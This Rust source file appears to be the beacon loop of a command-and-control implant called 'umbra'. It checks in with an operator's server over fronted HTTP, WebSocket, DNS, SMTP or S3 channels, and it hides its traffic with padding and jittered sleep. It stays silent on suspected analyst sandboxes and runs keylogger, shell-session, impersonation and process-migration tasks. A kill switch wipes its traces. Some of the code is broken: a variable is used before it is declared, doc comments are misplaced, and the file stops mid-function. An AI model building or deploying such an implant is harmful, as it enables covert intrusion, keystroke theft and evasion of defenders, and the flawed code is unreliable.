//! Beacon loop: handshake, check-in, task execution, jittered sleep.

use crate::config::{Config, Transport};
use crate::crypto;
use crate::session::Session;
use crate::sysinfo;
use crate::task;
use crate::transport::{Channel, HttpChannel, TcpChannel};
use crate::upk::{self, Value};
use crate::wire;

/// The route of the agent: which transport it speaks, in which order it may
/// fall back, and the front domain it hides behind.
///
/// The operator knows the network of the target: this one only speaks DNS,
/// that one goes through a front domain, the third one sits behind a proxy
/// that reads the traffic.  The server pushes the route with the task
/// batch, so the beacon follows it without being reconfigured.
#[derive(Clone, Debug, Default)]
pub struct Route {
    /// The transport the beacon uses first.
    pub primary: String,
    /// The order the beacon tries when the primary fails.
    pub fallback: Vec<String>,
    /// The domain the beacon puts in the Host header.
    pub front: String,
    /// The proxy in front of the beacon reads the traffic.
    pub inspect: bool,
    /// The route of the HTTP transport, when it is not the default.
    pub http_path: String,
    /// The route of the WebSocket transport, when it is not the default.
    pub ws_path: String,
}

impl Route {
    /// The transports the beacon tries, in order.
    ///
    /// The route of the server wins over the compiled-in transport; the
    /// fallback of the route comes after the primary.  A transport the
    /// beacon does not know is skipped: it cannot speak it.
    pub fn transports(&self, fallback: Transport) -> Vec<Transport> {
        let mut out: Vec<Transport> = Vec::new();
        let mut push = |name: &str| {
            if let Some(t) = Transport::parse(name) {
                if !out.contains(&t) {
                    out.push(t);
                }
            }
        };
        push(&self.primary);
        for name in &self.fallback {
            push(name);
        }
        if out.is_empty() {
            out.push(fallback);
        }
        out
    }
}

pub const VERSION: &str = env!("CARGO_PKG_VERSION");
pub const MAX_TASKS_PER_CYCLE: usize = 64;
/// Control frames (REKEY) tolerated before a TASK_BATCH.
// Control frames that may precede TASK_BATCH in one cycle: one REKEY plus up
// to four TASK_CANCEL frames (hub.MaxPendingCancels on the server).
const MAX_REKEY_ROUNDS: usize = 8;

/// The HELLO metadata: the host facts plus what this implant can do.
///
/// The capability list travels with the handshake, so the server never
/// queues a task the beacon cannot run and the operator sees the host's
/// reach before the first command.
fn hello_meta(peer_addr: &str) -> Value {
    let mut meta = sysinfo::meta(VERSION);
    if let Value::Map(ref mut fields) = meta {
        // Where the peer listener waits: the server chains a pivot
        // through this host when it knows the address.
        if !peer_addr.is_empty() {
            fields.insert("p2p".to_string(), upk::s(peer_addr));
        }
    }
    meta
}

/// The capability list of this implant: the task kinds it can run.
///
/// The list travels in the handshake, so the server never queues a task
/// the beacon cannot run and the operator sees the host's reach before
/// the first command.
pub fn hello_caps() -> Vec<Value> {
    task::capabilities().into_iter().map(upk::s).collect()
}

/// The platform details of this host: the os, the architecture and the
/// family the implant belongs to.
pub fn hello_platform() -> Value {
    let meta = sysinfo::meta(VERSION);
    let mut pairs: Vec<(&str, Value)> = Vec::new();
    if let Value::Map(ref fields) = meta {
        for key in ["os", "arch", "family"] {
            if let Some(value) = fields.get(key) {
                pairs.push((key, value.clone()));
            }
        }
    }
    upk::map(pairs)
}

pub struct Beacon {
    pub cfg: Config,
    session: Option<Session>,
    channel: Option<Box<dyn Channel>>,
    cycles: u64,
    failures: u32,
    /// The open sessions and the output they produced.
    ///
    /// A session outlives the connection: the operator writes to it and
    /// reads from it while it runs, so the beacon keeps the stream and
    /// sends the chunks as they arrive.
    backgrounds: std::collections::HashMap<String, (String, crate::sessions::Stream)>,
    /// What the engine thinks the host is.
    posture: crate::evade::Posture,
    /// How the host changes the behaviour of the beacon.
    policy: crate::evade::Policy,
    /// The state of the evasion engine: the settings, the schedule, the
    /// shaping and the kill switch.
    evade: crate::evade::State,
    /// The window the next check-in is drawn from.
    window: crate::evade::Window,
    /// How many buffers the memory hygiene wiped, and how many bytes.
    wiped_buffers: usize,
    wiped_bytes: usize,
    /// The address of the peer listener, once it is bound.
    ///
    /// It travels in the handshake: the server resolves the chain of a
    /// pivot from it.
    peer_addr: String,
    /// The route the server pushed: the transport the beacon speaks and
    /// the order it may fall back in.
    route: Option<Route>,
    /// When the implant started: the heartbeat carries the uptime.
    started_at: std::time::Instant,
}

impl Beacon {
    pub fn new(cfg: Config) -> Self {
        let evade = crate::evade::load_state();
        let posture = crate::evade::Posture::classify();
        let policy = posture.policy(&evade.settings);
        let window = crate::evade::Window::schedule(cfg.sleep, cfg.jitter);
        Beacon {
            cfg,
            session: None,
            channel: None,
            cycles: 0,
            failures: 0,
            backgrounds: std::collections::HashMap::new(),
            posture,
            policy,
            evade,
            window,
            wiped_buffers: 0,
            wiped_bytes: 0,
            peer_addr: String::new(),
            route: None,
            started_at: std::time::Instant::now(),
        }
    }

    fn log(&self, msg: &str) {
        if self.cfg.verbose {
            eprintln!("[umbra] {msg}");
        }
    }

    /// Run until `max_cycles` is reached (None = forever).
    /// Bind the peer listener and serve the pivots that are chained
    /// through this host.
    ///
    /// The listener is bound before the first handshake, so the address is
    /// known when the server learns about the beacon.
    pub fn start_peer_listener(&mut self) -> Result<(), String> {
        if self.cfg.peer_listen.is_empty() {
            return Ok(());
        }
        let (listener, addr) = crate::tunnel::bind_peer(&self.cfg.peer_listen)?;
        let psk = self.cfg.psk.clone();
        let agent_id = self.cfg.agent_id.clone();
        let verbose = self.cfg.verbose;
        std::thread::spawn(move || {
            crate::tunnel::serve_peer_listener(listener, psk, agent_id, verbose);
        });
        self.peer_addr = addr;
        self.log(&format!("peer listener on {}", self.peer_addr));
        Ok(())
    }

    pub fn run(&mut self, max_cycles: Option<u64>) -> Result<(), String> {
        self.start_peer_listener()?;
        loop {
            if let Some(limit) = max_cycles {
                if self.cycles >= limit {
                    return Ok(());
                }
            }
            // A host that looks like an analyst's sandbox is a host where
            // the implant may not answer at all.  The operator decides
            // whether it does; the default is to keep checking in.
            if self.policy.silence {
                self.log("the posture says silence: no check-in");
                sleep_secs(self.next_interval().saturating_mul(2));
                // The cycle still counts: a run with a limit has to end.
                self.cycles += 1;
                continue;
            }
            match self.run_once() {
                Ok(true) => {
                    self.failures = 0;
                    self.cycles += 1;
                }
                Ok(false) => return Ok(()),
                Err(e) => {
                    self.failures = self.failures.saturating_add(1);
                    self.log(&format!("cycle failed ({e}), backing off"));
                    let backoff = self.backoff_secs();
                    sleep_secs(backoff);
                    continue;
                }
            }
            if let Some(limit) = max_cycles {
                if self.cycles >= limit {
                    return Ok(());
                }
            }
            sleep_secs(self.next_interval());
        }
    }

    fn backoff_secs(&self) -> u64 {
        let base = self.cfg.sleep.max(1);
        let factor = 1u64 << self.failures.min(5);
        (base * factor).min(300)
    }

    /// Sleep interval with jitter and obfuscation.
    ///
    /// The interval comes out of the window that was drawn for this cycle:
    /// the window moves from cycle to cycle, so the gaps arrive in
    /// clusters instead of spreading evenly over the whole range, and the
    /// value inside the window is stable for the whole cycle.  The
    /// obfuscation adds an occasional long nap on top of it, because a
    /// uniform distribution is a signature of its own -- a beacon that
    /// checks in every 60.4 seconds on average is easier to find than one
    /// that sometimes sleeps for three minutes.
    fn next_interval(&self) -> u64 {
        // The window was drawn for this cycle: the value inside it is
        // stable, so two timers in the same cycle do not drift apart.
        let mut interval = self.window.pick();
        if self.cfg.sleep_obfuscate && self.policy.obfuscate && random_unit() < 0.25 {
            // One check-in in four takes a long nap: 1.5 to 3.5 times the
            // jittered interval.
            let factor = 1.5 + 2.0 * random_unit();
            interval = ((interval as f64) * factor) as u64;
        }
        interval.max(1)
    }

    /// The interval the schedule of the day and the posture of the host
    /// stretch the configured one with.
    fn base_interval(&self) -> u64 {
        let profile = self.evade.profile.factor(crate::evade::local_time());
        let factor = (profile * self.policy.sleep_factor).max(0.1);
        // The schedule may name a base of its own; without one the beacon
        // uses the interval it was configured with.
        let base = if self.evade.profile.base > 0 {
            self.evade.profile.base
        } else {
            self.cfg.sleep.max(1)
        };
        ((base as f64) * factor) as u64
    }

    /// The jitter of the check-ins, in percent.
    fn jitter_pct(&self) -> u32 {
        (self.cfg.jitter.min(90) + self.policy.jitter_bonus).min(90)
    }

    /// The reason the kill switch fired, if it did.
    fn kill_switch(&self) -> Option<String> {
        self.evade.kill_switch.check()
    }

    /// Stop the implant for good.
    ///
    /// The persistence entries go with it: the machine is left the way it
    /// was found, and the state of the engine is wiped, so nothing on the
    /// disk says that the implant was ever here.
    fn terminate(&mut self, reason: &str) {
        self.log(&format!("the kill switch fired: {reason}"));
        let args = upk::map(vec![("method", upk::s("all"))]);
        let _ = crate::persist::remove(&args);
        let _ = crate::evade::forget();
        self.session = None;
    }

    fn open_channel(&mut self) -> Result<(), String> {
        // The beacon knows more than one address: when the first server is
        // down, the next one is tried.  A server that moves does not take
        // the implant with it.
        //
        // The route of the server decides which transport is tried first
        // and which ones come after it: the operator knows the network of
        // the target, the beacon does not.
        let transports = self.transports();
        let mut last = "no server configured".to_string();
        for server in self.servers() {
            for transport in &transports {
                match self.open_channel_to(&server, *transport) {
                    Ok(()) => {
                        if server != self.cfg.server {
                            self.log(&format!("using the server {server}"));
                            self.cfg.server = server;
                        }
                        if *transport != self.cfg.transport {
                            self.log(&format!(
                                "the route says the server speaks {}",
                                transport.name()
                            ));
                            self.cfg.transport = *transport;
                        }
                        return Ok(());
                    }
                    Err(e) => last = e,
                }
            }
        }
        Err(last)
    }

    /// The transports the beacon tries, in order.
    ///
    /// The route of the server wins over the compiled-in transport; the
    /// fallback of the route comes after the primary.
    fn transports(&self) -> Vec<Transport> {
        match &self.route {
            Some(route) => route.transports(self.cfg.transport),
            None => vec![self.cfg.transport],
        }
    }

    /// The addresses the beacon dials, in order.
    fn servers(&self) -> Vec<String> {
        let mut out: Vec<String> = Vec::new();
        if !self.cfg.server.is_empty() {
            out.push(self.cfg.server.clone());
        }
        for extra in &self.cfg.servers {
            if !extra.is_empty() && !out.contains(extra) {
                out.push(extra.clone());
            }
        }
        out
    }

    /// Open the channel to one address with one transport.
    fn open_channel_to(&mut self, server: &str, transport: Transport) -> Result<(), String> {
        let ch: Box<dyn Channel> = match transport {
            Transport::Tcp => {
                let mut c = TcpChannel::new(server);
                if !self.cfg.proxy.is_empty() {
                    // The beacon dials through a SOCKS5 proxy: the proxy
                    // carries the traffic to the team server.
                    c = c.with_proxy(&self.cfg.proxy);
                }
                c.connect().map_err(|e| format!("connect {server}: {e}"))?;
                Box::new(c)
            }
            Transport::Http => Box::new(
                HttpChannel::new(server, &self.cfg.http_path, &self.cfg.http_host_header)
                    .map_err(|e| format!("http channel: {e}"))?,
            ),
            Transport::Dns => Box::new(
                crate::dns::DnsChannel::new(
                    &self.cfg.dns_resolver,
                    &self.cfg.dns_domain,
                    &self.cfg.agent_id,
                )
                .map_err(|e| format!("dns channel: {e}"))?,
            ),
            Transport::Ws => Box::new(
                crate::ws::WsChannel::new(
                    server,
                    &self.cfg.ws_path,
                    &self.cfg.ws_host_header,
                )
                .map_err(|e| format!("websocket channel: {e}"))?,
            ),
            Transport::Smtp => {
                // The mail transport: the frames are mailed out and the
                // answer is picked up from the mailbox.
                let secret = crate::mail::agent_secret(&self.cfg.psk, &self.cfg.agent_id);
                let cfg = crate::mail::MailConfig {
                    smtp: self.mail_address(&self.cfg.smtp_addr),
                    pop3: self.mail_address(&self.cfg.pop3_addr),
                    user: self.cfg.agent_id.clone(),
                    password: secret,
                    from: format!("{}@umbra.local", self.cfg.agent_id),
                    to: format!("{}@umbra.local", self.cfg.agent_id),
                };
                Box::new(crate::transport::BatchChannel::new(Box::new(
                    crate::mail::MailBackend::new(cfg),
                )))
            }
            Transport::S3 => {
                // The object transport: the work is read from one bucket
                // and the answer is written into another.
                let secret = crate::mail::agent_secret(&self.cfg.psk, &self.cfg.agent_id);
                let cfg = crate::s3::S3Config {
                    endpoint: self.mail_address(&self.cfg.s3_endpoint),
                    access_key: self.cfg.agent_id.clone(),
                    secret_key: secret,
                    region: self.cfg.s3_region.clone(),
                    tasks_bucket: self.cfg.s3_tasks_bucket.clone(),
                    results_bucket: self.cfg.s3_results_bucket.clone(),
                };
                Box::new(crate::transport::BatchChannel::new(Box::new(
                    crate::s3::S3Backend::new(cfg),
                )))
            }
        };
        self.channel = Some(ch);
        Ok(())
    }

    /// The address of a service of the batch transports.
    ///
    /// An address that was not configured is the address of the team
    /// server: the mail and the object endpoints usually live next to it.
    fn mail_address(&self, configured: &str) -> String {
        if configured.trim().is_empty() {
            return self.cfg.server.clone();
        }
        configured.trim().to_string()
    }

    fn run_once(&mut self) -> Result<bool, String> {
        // The state of the engine is read again every cycle: the operator
        // may have armed the kill switch or changed the schedule since
        // the last check-in.
        self.evade = crate::evade::load_state();
        // The kill switch is looked at before anything else: when it
        // fires, the implant stops existing and does not even talk to the
        // server again.
        if let Some(reason) = self.kill_switch() {
            self.terminate(&reason);
            return Ok(false);
        }
        // The posture is looked at again every now and then: a machine
        // that was a workstation when the implant started may be a lab
        // machine now.
        if self.cycles % 10 == 0 {
            self.posture = crate::evade::Posture::classify();
        }
        self.policy = self.posture.policy(&self.evade.settings);
        // The window of this cycle is drawn once: the gaps between the
        // check-ins arrive in clusters instead of spreading evenly over
        // the whole range.
        self.window = crate::evade::Window::schedule(self.base_interval(), self.jitter_pct());
        self.session = None;
        self.open_channel()?;
        self.handshake()?;
        let mut keep_running = self.cycle()?;
        // A live session keeps the connection open: the operator writes to it
        // and reads from it while it runs, so the beacon stays connected
        // instead of sleeping between the check-ins.
        while keep_running && !self.backgrounds.is_empty() {
            self.drain_backgrounds()?;
            if self.backgrounds.is_empty() {
                break;
            }
            sleep_secs(1);
            keep_running = self.cycle()?;
        }
        self.drain_backgrounds()?;
        // Traffic padding: the last request of a cycle is padded to a bucket
        // size, so its length does not tell how much work the cycle carried.
        self.pad_pending()?;
        if let Some(ch) = self.channel.as_mut() {
            let _ = ch.flush();
            ch.close();
        }
        self.channel = None;
        self.session = None;
        Ok(keep_running)
    }

    /// Pad the pending request to a bucket size.
    ///
    /// The padding is a sealed PADDING frame with a random body: the server
    /// ignores it, and only the length of the request becomes uniform.  The
    /// size of the frame depends on the length prefix of its body, so the
    /// body length is solved for instead of guessed.
    fn pad_pending(&mut self) -> Result<(), String> {
        // The shaping decides the size of the frames; the configured
        // bucket is the fallback.
        let bucket = match self.evade.shaping.granularity() {
            Some(size) => size,
            None => self.cfg.http_pad as usize,
        };
        if bucket == 0 {
            return Ok(());
        }
        let pending = match self.channel.as_mut() {
            Some(ch) => ch.pending_len(),
            None => 0,
        };
        if pending == 0 {
            return Ok(());
        }
        // The fixed part of a frame: prelude, nonce, the upk tag of the body
        // and the authentication tag.
        let overhead = wire::HEADER_LEN + wire::TAG_LEN + 1;
        let target = (pending + overhead + bucket - 1) / bucket * bucket;
        for prefix in 1..=3usize {
            let length = target as isize - pending as isize - overhead as isize - prefix as isize;
            if length < 0 {
                continue;
            }
            let length = length as usize;
            if uvarint_len(length as u64) != prefix {
                continue;
            }
            let body = crate::crypto::random_bytes(length);
            let value = upk::Value::Bin(body);
            let frame = self.seal(wire::MSG_PADDING, &value)?;
            if pending + frame.len() != target {
                self.log("the padding did not reach the bucket");
            }
            self.write(&frame)?;
            return Ok(());
        }
        Ok(())
    }

    // -- handshake -------------------------------------------------------
    /// The handshake is the shared client half of the protocol; the pivot
    /// callback uses the very same code, so the two can never drift apart.
    fn handshake(&mut self) -> Result<(), String> {
        let suites = crypto::supported_suites();
        let suite = *suites.first().ok_or("no AEAD suite compiled in")?;
        // The peer listener may have been bound after the last handshake
        // (the p2p task does that), so the address is read every time.
        let peer = crate::tunnel::peer_address();
        let meta = hello_meta(&peer);
        let hello = crate::link::Hello {
            version: crate::wire::HELLO_VERSION,
            caps: hello_caps(),
            implant_version: VERSION.to_string(),
            abi: crate::wire::ABI_VERSION,
            platform: hello_platform(),
        };
        let handshake = {
            let channel = self.channel.as_mut().ok_or("the channel is closed")?;
            crate::link::client_handshake(
                channel.as_mut(),
                &self.cfg.psk,
                crypto::ROLE_AGENT,
                &self.cfg.agent_id,
                suite,
                meta,
                &hello,
            )?
        };
        let session_id = handshake.session_id.clone();
        self.session = Some(handshake.session);

        if let Some(cfg) = handshake.ack.get("cfg") {
            let sleep = cfg.u64_or("sleep", self.cfg.sleep);
            let jitter = cfg.u64_or("jitter", self.cfg.jitter as u64) as u32;
            let obfuscate = cfg.bool_or("obf", self.cfg.sleep_obfuscate);
            self.apply_policy(sleep, jitter);
            self.cfg.sleep_obfuscate = obfuscate;
        }
        if let Some(ch) = self.channel.as_mut() {
            ch.set_session_id(&crate::config::hex_encode(&session_id));
        }
        self.log("handshake complete");
        Ok(())
    }

    fn apply_policy(&mut self, sleep: u64, jitter: u32) {
        if sleep > 0 {
            self.cfg.sleep = sleep;
        }
        if jitter <= 90 {
            self.cfg.jitter = jitter;
        }
    }

    /// Apply the route the server pushed.
    ///
    /// The route is the road the beacon has to take: the operator knows
    /// the network of the target, the beacon does not.  A route the
    /// beacon cannot follow is ignored: the compiled-in transport stays.
    fn apply_route(&mut self, value: Option<&Value>) {
        let value = match value {
            Some(v) => v,
            None => return,
        };
        let primary = value.str_or("primary", "");
        if primary.is_empty() {
            return;
        }
        let mut fallback: Vec<String> = Vec::new();
        if let Some(Value::Arr(items)) = value.get("fallback") {
            for item in items {
                let name = match item {
                    Value::Str(s) => s.clone(),
                    _ => String::new(),
                };
                if !name.is_empty() {
                    fallback.push(name);
                }
            }
        }
        let route = Route {
            primary: primary.to_ascii_lowercase(),
            fallback: fallback
                .iter()
                .map(|f| f.to_ascii_lowercase())
                .collect(),
            front: value.str_or("front", ""),
            inspect: value.bool_or("inspect", false),
            http_path: value.str_or("http_path", ""),
            ws_path: value.str_or("ws_path", ""),
        };
        // The front domain replaces the Host header of the HTTP and the
        // WebSocket transport: the request goes to the server, but it
        // looks like it went to the front.
        if !route.front.is_empty() {
            self.cfg.http_host_header = route.front.clone();
            self.cfg.ws_host_header = route.front.clone();
        }
        if !route.http_path.is_empty() {
            self.cfg.http_path = route.http_path.clone();
        }
        if !route.ws_path.is_empty() {
            self.cfg.ws_path = route.ws_path.clone();
        }
        if route.inspect {
            // A proxy that reads the traffic gets a shape that does not
            // look like a protocol: the beacon keeps the padding on.
            self.cfg.sleep_obfuscate = true;
        }
        self.log(&format!(
            "the route is now {} (fallback: {})",
            route.primary,
            route.fallback.join(", ")
        ));
        self.route = Some(route);
    }

    /// The context the tasks get: identity, key and C2 address.
    fn context(&self) -> task::Context {
        task::Context {
            vpn_addr: self.cfg.vpn_addr.clone(),
            psk: self.cfg.psk.clone(),
            agent_id: self.cfg.agent_id.clone(),
            server: self.cfg.server.clone(),
            verbose: self.cfg.verbose,
            handover: self.cfg.handover(),
        }
    }

    // -- one beacon cycle ------------------------------------------------
    fn cycle(&mut self) -> Result<bool, String> {
        let ts = now_secs();
        // The check-in carries the identity of the implant: when the
        // operator made it become somebody else, the server shows that in
        // the inventory instead of leaving a stale name there.
        let mut checkin_fields = vec![("ts", upk::u(ts)), ("n", upk::u(0))];
        // The address of the peer listener travels with every check-in:
        // the server learns where a chained pivot can reach this host.
        let peer = crate::tunnel::peer_address();
        if !peer.is_empty() {
            checkin_fields.push(("p2p", upk::s(&peer)));
        }
        if let Some(state) = crate::post::impersonation() {
            checkin_fields.push(("impersonation", upk::s(&state.identity.account)));
            checkin_fields.push(("impersonation_session", upk::u(state.identity.session as u64)));
        }
        let checkin = upk::map(checkin_fields);
        let frame = self.seal(wire::MSG_CHECKIN, &checkin)?;
        self.write(&frame)?;

        // The server may rotate keys right before the batch. A REKEY frame is
        // always sealed with the OLD key set and is always followed by
        // TASK_BATCH, so read until the batch arrives instead of guessing a
        // frame count. Bound the loop so a hostile server cannot stall us.
        let mut batch = upk::map(vec![]);
        let mut cancelled: Vec<String> = Vec::new();
        let mut seen = 0;
        loop {
            seen += 1;
            if seen > MAX_REKEY_ROUNDS {
                return Err("too many control frames before TASK_BATCH".to_string());
            }
            let resp = self.read()?;
            let (msg_type, body) = self.open(&resp)?;
            match msg_type {
                wire::MSG_REKEY => {
                    let seed = body.bin_or("seed", &[]);
                    if seed.len() != 32 {
                        return Err("malformed REKEY seed".to_string());
                    }
                    if let Some(sess) = self.session.as_mut() {
                        sess.apply_rekey(&seed).map_err(|e| format!("rekey: {e}"))?;
                        self.log("session rekeyed");
                    }
                }
                wire::MSG_TASK_CANCEL => {
                    // The operator cancelled a task that this beacon had already
                    // received. Record it and keep reading: the batch that
                    // follows is the one that decides what runs.
                    let id = body.str_or("id", "");
                    if id.is_empty() {
                        return Err("TASK_CANCEL without a task id".to_string());
                    }
                    self.log(&format!("task {id} cancelled by operator"));
                    cancelled.push(id);
                }
                wire::MSG_TASK_BATCH => {
                    batch = body;
                    break;
                }
                wire::MSG_KILL => {
                    self.log("server sent KILL");
                    return Ok(false);
                }
                wire::MSG_PADDING => {
                    // Padding frames carry random bytes and are ignored: they
                    // only make the traffic shape uniform.
                }
                other => {
                    return Err(format!("expected TASK_BATCH, got {}", wire::type_name(other)))
                }
            }
        }

        // The heartbeat: the small frame that says "still here, this is
        // what I am".  It is sent after the batch, because a frame that
        // is sent between the check-in and the batch would be sealed with
        // the old keys when the server has already switched.
        self.send_heartbeat(tasks.len())?;

        // Server-side beacon policy wins over the compiled-in defaults.
        self.apply_policy(batch.u64_or("sleep", self.cfg.sleep), batch.u64_or("jitter", self.cfg.jitter as u64) as u32);
        // The server also decides whether the check-in pattern is obfuscated.
        self.cfg.sleep_obfuscate = batch.bool_or("obf", self.cfg.sleep_obfuscate);
        // The route of the agent travels with the batch: the beacon learns
        // which transport it speaks and in which order it may fall back.
        self.apply_route(batch.get("route"));

        let mut tasks = match batch.get("tasks") {
            Some(Value::Arr(items)) => items.clone(),
            _ => Vec::new(),
        };
        if self.evade.shaping.reorder && tasks.len() > 1 {
            // The order of the operations inside a cycle is shuffled: a
            // host that always runs the tasks in the order the server
            // sent them has a signature of its own.
            for i in (1..tasks.len()).rev() {
                let j = (crypto::random_bytes(2)[0] as usize) % (i + 1);
                tasks.swap(i, j);
            }
        }
        for (idx, t) in tasks.iter().enumerate() {
            if idx >= MAX_TASKS_PER_CYCLE {
                break;
            }
            let id = t.str_or("id", "");
            let kind = t.str_or("kind", "");
            let args = t.get("args").cloned().unwrap_or_else(|| upk::map(vec![]));

            if cancelled.iter().any(|c| c == &id) {
                // Still report: the server keeps the cancelled state and stores
                // the output, so the operator sees that nothing ran.
                self.log(&format!("task {id} skipped (cancelled)"));
                let outcome = task::Outcome::err(125, "cancelled before execution");
                self.send_result(&id, outcome)?;
                continue;
            }
            self.log(&format!("task {id} kind={kind}"));

            // The marker of the kill switch: the operator sends it and the
            // implant stops existing, with its persistence entries.
            if let Some(reason) = self.evade.kill_switch.marker_fired(&args) {
                let outcome = task::Outcome::err(0, format!("the kill switch fired: {reason}"));
                self.send_result(&id, outcome)?;
                self.terminate(&reason);
                return Ok(false);
            }

            match kind.as_str() {
                "keylog" => {
                    // The key logger streams the keys while it runs, exactly
                    // like a session does.
                    let seconds = args.u64_or("seconds", 60);
                    match crate::desktop::keylog(seconds) {
                        Ok(stream) => {
                            let sid = format!("k-{}", crate::config::hex_encode(
                                &crate::crypto::random_bytes(4)));
                            self.log(&format!("key logger {sid} started"));
                            let value = upk::map(vec![
                                ("id", upk::s(&id)),
                                ("code", upk::i(0)),
                                ("out", upk::bin(&[])),
                                ("err", upk::s("")),
                                ("partial", upk::bool_(true)),
                                ("session", upk::s(&sid)),
                            ]);
                            let frame = self.seal(wire::MSG_RESULT, &value)?;
                            self.write(&frame)?;
                            self.backgrounds.insert(id.clone(), (sid, stream));
                        }
                        Err(e) => {
                            let outcome = task::Outcome::err(1, e);
                            self.send_result(&id, outcome)?;
                        }
                    }
                }
                "keylog.file" => {
                    // The key logger writes into a file: the operator
                    // fetches it later, at their own pace.
                    let path = args.str_or("path", "");
                    let seconds = args.u64_or("seconds", 300);
                    match crate::desktop::keylog_to_file(&path, seconds) {
                        Ok(report) => {
                            self.log(&format!("key logger writes to {path}"));
                            let outcome = task::Outcome::ok(report.into_bytes());
                            self.send_result(&id, outcome)?;
                        }
                        Err(e) => {
                            let outcome = task::Outcome::err(1, e);
                            self.send_result(&id, outcome)?;
                        }
                    }
                }
                "session.open" => {
                    // The session outlives the task: the beacon keeps the
                    // stream, sends the output as partial results and
                    // completes the task when the session ends.
                    let cmd = args.str_or("cmd", "");
                    match crate::sessions::open(&cmd) {
                        Ok((sid, stream)) => {
                            self.log(&format!("session {sid} opened"));
                            // The session id travels with the first chunk, so
                            // the operator can address the session before it
                            // produced any output at all.
                            let value = upk::map(vec![
                                ("id", upk::s(&id)),
                                ("code", upk::i(0)),
                                ("out", upk::bin(&[])),
                                ("err", upk::s("")),
                                ("partial", upk::bool_(true)),
                                ("session", upk::s(&sid)),
                            ]);
                            let frame = self.seal(wire::MSG_RESULT, &value)?;
                            self.write(&frame)?;
                            self.backgrounds.insert(id.clone(), (sid, stream));
                        }
                        Err(e) => {
                            let outcome = task::Outcome::err(1, e);
                            self.send_result(&id, outcome)?;
                        }
                    }
                }
                "exit" | "kill" => {
                    // The exit is the last word of the operator: the
                    // implant takes its persistence entries with it, so the
                    // machine is left the way it was found.  This is also
                    // the path the panic task of the server takes.
                    //
                    // The entries are removed first and the result reports
                    // the empty record, so the inventory of the server
                    // does not keep a lie after the engagement.
                    let empty = upk::map(vec![("method", upk::s("all"))]);
                    let _ = crate::persist::remove(&empty);
                    let report = crate::persist::list(&Value::Null);
                    let outcome = task::run(&self.context(), &kind, &args)
                        .with("persist", upk::arr(report.entries))
                        .with("persist_total", upk::u(0))
                        .with("persist_broken", upk::u(0));
                    self.send_result(&id, outcome)?;
                    self.send_bye()?;
                    self.terminate("the operator ended the engagement");
                    return Ok(false);
                }
                "sleep" => {
                    let sleep = args.u64_or("sleep", self.cfg.sleep);
                    let jitter = args.u64_or("jitter", self.cfg.jitter as u64) as u32;
                    self.apply_policy(sleep, jitter);
                    let outcome = task::run(&self.context(), "sleep", &args);
                    self.send_result(&id, outcome)?;
                }
                "hygiene.memory" => {
                    // The counters of the memory hygiene: the beacon knows
                    // how many buffers it wiped and how many bytes they
                    // held.
                    match crate::hygiene::memory(&args) {
                        Ok((text, extra)) => {
                            let mut outcome = task::Outcome::ok(text.into_bytes())
                                .with("hygiene_wiped", upk::u(self.wiped_buffers as u64))
                                .with("hygiene_bytes", upk::u(self.wiped_bytes as u64));
                            for (key, value) in extra {
                                outcome = outcome.with(key, value);
                            }
                            self.send_result(&id, outcome)?;
                        }
                        Err(e) => {
                            let outcome = task::Outcome::err(1, e);
                            self.send_result(&id, outcome)?;
                        }
                    }
                }
                _ => {
                    let outcome = task::run(&self.context(), &kind, &args);
                    // A migration that moves the implant out of its own
                    // process asks the beacon to stop: the answer is sent
                    // first, and the process that took over keeps the work.
                    let leave = task::wants_exit(&outcome);
                    self.send_result(&id, outcome)?;
                    if leave {
                        self.send_bye()?;
                        self.terminate("the implant moved into another process");
                        return Ok(false);
                    }
                }
            }
            // A one-shot impersonation was meant for this task: the implant
            // gives the account back as soon as the task is done.
            crate::post::end_one_shot();
        }

        self.send_bye()?;
        Ok(true)
    }

    /// Send the output the open sessions produced.
    ///
    /// A chunk is a partial result: the task is still running, so the server
    /// appends the chunk instead of completing the task.  When a session ends,
    /// its exit status completes the task.
    /// Send the heartbeat: the cheap signal that the implant is alive.
    ///
    /// The heartbeat says what the implant is and how much work it is
    /// carrying.  The server shows it next to the host, so an operator
    /// can tell "the host is busy" from "the host is gone".
    fn send_heartbeat(&mut self, busy: usize) -> Result<(), String> {
        let value = upk::map(vec![
            ("v", upk::u(1)),
            ("iver", upk::s(VERSION)),
            ("abi", upk::u(crate::wire::ABI_VERSION as u64)),
            ("busy", upk::u(busy as u64)),
            ("up", upk::u(self.started_at.elapsed().as_secs())),
        ]);
        let frame = self.seal(wire::MSG_HEARTBEAT, &value)?;
        self.write(&frame)
    }

    fn drain_backgrounds(&mut self) -> Result<(), String> {
        // Collect first and send afterwards: sending borrows the session.
        let mut pending: Vec<(String, String, Vec<u8>)> = Vec::new();
        let mut finished: Vec<(String, task::Outcome)> = Vec::new();
        for (id, (sid, stream)) in self.backgrounds.iter_mut() {
            while let Ok(chunk) = stream.rx.try_recv() {
                pending.push((id.clone(), sid.clone(), chunk));
            }
            if let Some(result) = stream.outcome() {
                let outcome = match result {
                    Ok(o) => o,
                    Err(e) => task::Outcome::err(1, e),
                };
                finished.push((id.clone(), outcome));
            }
        }
        for (id, sid, mut chunk) in pending {
            let value = upk::map(vec![
                ("id", upk::s(&id)),
                ("code", upk::i(0)),
                ("out", upk::bin(&chunk)),
                ("err", upk::s("")),
                ("partial", upk::bool_(true)),
                ("session", upk::s(&sid)),
            ]);
            let frame = self.seal(wire::MSG_RESULT, &value)?;
            self.write(&frame)?;
            // The keystrokes are wiped after they were sent: the server
            // has them, and the implant does not need them in memory.
            self.wiped_buffers += 1;
            self.wiped_bytes += chunk.len();
            crypto::zeroize(&mut chunk);
        }
        for (id, outcome) in finished {
            self.backgrounds.remove(&id);
            self.send_result(&id, outcome)?;
        }
        Ok(())
    }

    /// Send the result of a task and wipe the output behind it.
    ///
    /// The server has the output, and the implant does not need it in
    /// memory: the buffer is wiped here, on the happy path and on the
    /// path where the frame could not be written either.
    fn send_result(&mut self, task_id: &str, mut outcome: task::Outcome) -> Result<(), String> {
        let value = outcome.to_value(task_id);
        let frame = match self.seal(wire::MSG_RESULT, &value) {
            Ok(frame) => frame,
            Err(e) => {
                let mut buffer = std::mem::replace(&mut outcome.out, Vec::new());
                self.wiped_buffers += 1;
                self.wiped_bytes += buffer.len();
                crypto::zeroize(&mut buffer);
                return Err(e);
            }
        };
        self.write(&frame)?;
        let mut buffer = std::mem::replace(&mut outcome.out, Vec::new());
        self.wiped_buffers += 1;
        self.wiped_bytes += buffer.len();
        crypto::zeroize(&mut buffer);
        Ok(())
    }

    fn send_bye(&mut self) -> Result<(), String> {
